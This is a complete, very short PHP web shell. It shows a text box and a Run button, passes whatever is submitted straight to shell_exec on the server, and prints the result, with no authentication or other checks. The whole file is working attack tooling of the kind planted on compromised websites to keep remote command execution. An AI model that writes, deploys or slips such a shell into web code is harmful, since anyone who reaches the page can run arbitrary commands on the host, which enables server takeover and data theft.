<?php
if(isset($_POST['runcmd'])){
$cmd="Result:
";
if($_POST['cmd']==""){
$cmd .= "Not Command";
}
else{
$cmd .= shell_exec($_POST['cmd']);
}
}
?>
<form action="" method="POST">
<input type="text" name="cmd" /><button type="submit" name="runcmd">Run</button>
</form>
<br/>
<pre><?php echo $cmd; ?></pre>
